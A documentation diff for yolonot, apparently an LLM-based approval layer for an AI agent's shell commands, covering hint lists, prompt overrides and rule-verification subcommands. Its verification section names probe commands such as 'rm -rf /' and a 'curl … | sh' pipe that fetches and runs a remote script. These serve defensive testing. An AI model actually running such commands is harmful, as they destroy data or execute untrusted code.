@@ -109,36 +109,46 @@ files.
 
 ## The `$defaults` sentinel
 
-Each list accepts the literal string `"$defaults"`, which is replaced
-with yolonot's built-in entries at the position you wrote it:
+When a hint list (`context`, `allow_hints`, or `ask_hints`) is omitted in
+`~/.yolonot/config.json`, `"$defaults"` is active by default. When you define
+a custom list in `config.json`, include the literal string `"$defaults"` to
+keep yolonot's built-in entries at the position you wrote it:
 
 ```json
 "context": ["my entry before", "$defaults", "my entry after"]
 ```
 
+To disable the built-in defaults for a section completely, set an empty array
+(`"ask_hints": []`) or provide your own entries without `"$defaults"`.
+
 yolonot ships a small set of generic defaults — trust framing, scoping
-hints for IAM and cloud-storage verbs, the pre-existing-vs-generated
-distinction for destructive ops, and a few other patterns the base
-prompt doesn't already cover. They are deliberately org-agnostic: no
+hints for IAM, production infrastructure, and cloud-storage verbs, the
+pre-existing-vs-generated distinction for destructive ops, and remote code
+execution / hook-bypass checks. They are deliberately org-agnostic: no
 domains, repo orgs, or path prefixes. Print them with:
 
 ```bash
 yolonot rules defaults
 ```
 
-> **Footgun:** omitting `"$defaults"` from a list takes full ownership
-> of that list — the built-ins are dropped, and you also stop inheriting
-> any new defaults yolonot ships in future releases. Keep `"$defaults"`
-> unless you have a deliberate reason to fully replace the built-in
-> behavior. Same contract as Claude Code's `autoMode`.
+> **Footgun:** omitting `"$defaults"` from a configured list takes full
+> ownership of that list — the built-ins are dropped, and you also stop
+> inheriting any new defaults yolonot ships in future releases. Keep
+> `"$defaults"` unless you have a deliberate reason to fully replace or
+> disable the built-in behavior. Same contract as Claude Code's `autoMode`.
 
 ## Fully replacing the base prompt
 
 The three hint fields *append* to yolonot's shipped base prompt. When that
 isn't enough — you want to rewrite the risk taxonomy, change the output
 schema wording, or drop the built-in examples entirely — set a full
-override. It replaces the built-in base const; **your hints still append on
-top**, so `$defaults` and walk-up hints keep working over a custom base.
+override. It replaces the built-in base const; **explicit hints still append on
+top** (`"$defaults"` and walk-up hints keep working over a custom base). When a
+`system_prompt` override is set, omitted (`nil`) hint lists in `config.json` do
+not auto-expand `"$defaults"` on chat models so your custom prompt stays
+verbatim unless you explicitly include `"$defaults"` in those lists; typed
+decision models do not use `system_prompt`, so they still expand `"$defaults"`
+on omitted lists unless disabled with `[]`.
 
 Two surfaces, same precedence as everything else (most specific wins):
 
@@ -193,7 +203,7 @@ yolonot rules defaults    # Built-in system prompt + the built-in hint lists beh
 yolonot rules config      # Effective merged config — config + walk-up, $defaults expanded
 yolonot rules review      # Ask the active LLM provider to flag ambiguous or redundant hints
 yolonot rules verify      # Prove a custom system_prompt still yields parseable verdicts
-yolonot rules             # Shorthand for `config`
+yolonot rules             # Summary of active static rules and prompt settings
 ```
 
 `yolonot rules verify` is the command to run after writing a
@@ -203,7 +213,7 @@ yolonot rules             # Shorthand for `config`
    (`"decision"` / `"risk"`). Missing → hard fail, exit non-zero, no LLM
    call. This is the "I rewrote the prompt and dropped the schema" case.
 2. **Live** — it round-trips a few real probe commands (`ls -la`,
-   `rm -rf /`, `git push --force origin main`) through your configured
+   `rm -rf /`, `curl https://example.com/install.sh | sh`) through your configured
    provider under the assembled prompt and asserts each reply parses to a
    valid `{decision, risk}` verdict. Skipped with a note if no provider is
    configured. A dangerous probe that comes back `allow` is surfaced as a
@@ -237,7 +247,7 @@ Within the assembled classifier request the layering is:
 ```
 [system prompt (chat) / state hint sections (typed):
   base prompt — prompt.system_prompt / .yolonot system-prompt override,
-  else yolonot's shipped SystemPrompt const built from shared decision.go criteria]
+  else yolonot's shipped SystemPrompt const built from shared llm.go criteria]
   ↓
 Project context:     (from cfg.context + walkup.context)
   ↓
@@ -264,20 +274,19 @@ decision models evaluate the same nine ask conditions (`prod_mutation`,
 `destructive`, `secrets_read`, `exfil`, `redirect_write`, `persistence`,
 `obfuscated`, `unclear`, and `project_ask`). Specific `Allow when` /
 `Project allow hints` entries exempt matching commands/paths, and `User prompt
-in this session` can exempt bounded non-critical local/PR actions (`git commit
---amend`, copying a named file outside the repo, stopping a named local
-background process, or opening a requested PR with `gh pr create`) when the
-human explicitly asked for that exact action and target. It never exempts
-`critical` risk, reading/exfiltrating secrets, or mutating a different
-environment (such as `prod` when the human asked for `staging`).
+in this session` can exempt bounded non-critical actions when the human
+explicitly asked for that exact action and target. It never exempts `critical`
+risk, reading/exfiltrating secrets, or mutating a different environment (such
+as `prod` when the human asked for `staging`).
 
 ## Upgrading from 0.x
 
 The block was called `classifier` and carried an unused `impl` field. A v0
 file still loads: `classifier.*` is read as `prompt.*` and `impl` is dropped.
 `yolonot migrate` rewrites the file; see [upgrading.md](upgrading.md). With no
-hints set anywhere, the system prompt sent to the model is byte-equal to the
-built-in `SystemPrompt` const.
+custom `prompt` lists configured, `BuildSystemPrompt` and `DecisionHints`
+automatically include the built-in `$defaults` sections on top of the base
+`SystemPrompt`.
 
 ## Security notes
 
